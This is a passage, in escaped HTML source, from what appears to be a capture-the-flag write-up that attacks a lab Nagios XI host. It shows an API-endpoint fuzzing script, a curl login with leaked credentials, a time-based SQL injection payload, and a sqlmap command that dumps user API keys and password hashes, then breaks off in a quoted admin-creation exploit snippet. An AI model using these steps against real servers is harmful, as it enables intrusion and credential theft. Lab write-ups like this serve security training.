&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;wordlist_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordlist_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;No API Key provided&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Message &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; at endpoint &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Usage: fetch-req-msg.py &amp;lt;URL&amp;gt; &amp;lt;WORDLIST&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We are filtering it out any messages that contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No API Key provided&lt;/code&gt; string and printing the ones with a different message. Running the script yields:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python fetch-req-msg.py https://nagios.monitored.htb/nagiosxi/api/v1/ api-endpoints.txt 
Message &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;No request was made&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/0

Message &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;You can only use POST with authenticate.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We note an authentication endpoint present that does not require an API key. After a bit of research, I’ve found &lt;a href=&quot;https://support.nagios.com/forum/viewtopic.php?f=16&amp;amp;t=58783&quot;&gt;this&lt;/a&gt; topic on this endpoint, where it states that we can authenticate via cURL using 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -XPOST -k -L &apos;http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1&apos; -d &apos;username=nagiosadmin&amp;amp;password=YOURPASS&amp;amp;valid_min=5&apos;&lt;/code&gt;. We can try to authenticate with the credentials we found using snmpwalk:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=1000&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;svc&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;auth_token&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;080377be1a39ccd6c8126a03a3248e9046a1e6dd&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;valid_min&quot;&lt;/span&gt;: 1000,
    &lt;span class=&quot;s2&quot;&gt;&quot;valid_until&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Wed, 17 Jan 2024 12:57:22 -0500&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this, we got an auth_token, which might be more than enough to test and abuse CVE-2023-40931. Taking a look at the CVE, we see that the affected endpoint is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; and we must send a POST request. With BurpSuite, this becomes easy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored5.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, session has timed out means we are not authenticated anymore. I’ve tried to pass the authentication token as an Authentication header, but that did not work. I’ve also tried to send it in the body of the request with the names &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token&lt;/code&gt;, that 
did not work either. Finally, after some attempts, I’ve tried to change the request to a GET request, and this happened:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored6.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright! We are getting somewhere. I’ve tried a simple SQL injection in the ID parameter: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=3&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;&lt;/code&gt; and the response was intriguing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/monitored7.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The error message indicates we might have a SQL injection here. Let’s run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we’ll use this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=500&quot; | awk -F&apos;&quot;&apos; &apos;{print$12}&apos;&lt;/code&gt; command to clean the output to just be the token itself, and then run SQLMap with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-T xi_users&lt;/code&gt;, which is the table in Nagios XI that contains users information.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;amp;id=3&amp;amp;token=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-ksX&lt;/span&gt; POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=500&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print$12}&apos;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; nagiosxi &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; xi_users
        ___
       __H__                                                                                                             
 ___ ___[&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;_____ ___ ___  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1.7.12#stable&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                                                                
|_ -| &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.]     | .&lt;span class=&quot;s1&quot;&gt;&apos;| . |                                                                                                
|___|_  [(]_|_|_|__,|  _|                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;&lt;/span&gt;s responsibility to obey all applicable &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;, state and federal laws. Developers assume no liability and are not responsible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;any misuse or damage caused by this program

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; starting @ 22:38:17 /2024-01-16/

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:17] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
you have not declared cookie&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;server wants to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;its own &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;nagiosxi=sncb97hqvcq...s60dv5asic&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to use those &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target is protected by some kind of WAF/IPS
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target URL content is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL content is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] heuristic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;shows that GET parameter &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt; might be injectable &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;possible DBMS: &lt;span class=&quot;s1&quot;&gt;&apos;MySQL&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SQL injection on GET parameter &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;
it looks like the back-end DBMS is &lt;span class=&quot;s1&quot;&gt;&apos;MySQL&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to skip &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;payloads specific &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;other DBMSes? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;&apos;AND boolean-based blind - WHERE or HAVING clause&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] reflective value&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; found and filtering out
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
Database: nagiosxi
Table: xi_users
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | &lt;span class=&quot;nv&quot;&gt;$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C&lt;/span&gt; | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | &lt;span class=&quot;nv&quot;&gt;$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK&lt;/span&gt; | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705449034   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 8              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Giving us access to the administrator’s API key and password. Using &lt;a href=&quot;https://www.tunnelsup.com/hash-analyzer/&quot;&gt;Hash Analyzer&lt;/a&gt; we can see that the password is using bcrypt hash. I’ve tried to find a match with John The Ripper, but with no success. So this got me thinking… Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
Again, with a bit research, we can find &lt;a href=&quot;https://support.nagios.com/forum/viewtopic.php?f=16&amp;amp;t=42923&quot;&gt;this&lt;/a&gt; topic, where it says
we can create an accout with this cURL command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -XPOST &quot;http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;amp;pretty=1&quot; -d &quot;username=jmcdouglas&amp;amp;password=test&amp;amp;name=Jordan%20McDouglas&amp;amp;email=jmcdouglas@localhost&quot;&lt;/code&gt;. However, this will create a normal user. We need an admin user. Then, I found &lt;a href=&quot;https://www.exploit-db.com/exploits/44969&quot;&gt;this&lt;/a&gt; on exploit-db, which is a completely different exploit, but has these lines:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_add_admin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vprint_status&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;STEP 3: trying to add admin user with key #{key}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_request_cgi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/nagiosxi/api/v1/system/user&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ctype&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vars_get&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;apikey&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
